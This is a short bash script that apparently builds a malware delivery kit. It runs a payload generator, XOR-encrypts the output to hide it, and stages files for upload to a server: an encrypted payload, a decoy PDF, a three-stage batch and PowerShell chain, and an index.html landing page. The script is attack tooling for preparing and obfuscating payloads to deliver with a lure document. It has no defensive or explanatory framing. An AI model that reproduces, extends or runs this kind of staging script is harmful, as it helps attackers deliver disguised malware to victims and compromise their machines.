#!/bin/bash
echo "[🚀] Generating all payloads..."
cd tools && ./generate_payload.sh && cd ..
if [ -f output/payload.raw ]; then
    python3 tools/xor_encrypt.py output/payload.raw payload.enc
    echo ""
    echo "[✓] Files ready for upload to '"$FULL_BASE_URL"'"
    echo "    - payload.enc"
    echo "    - decoy.pdf"
    echo "    - payloads/stage1.bat"
    echo "    - payloads/stage2.ps1"
    echo "    - payloads/stage3.ps1"
    echo "    - index.html"
    echo ""
    ls -la payload.enc decoy.pdf payloads/ 2>/dev/null
else
    echo "[✗] Payload generation failed"
fi
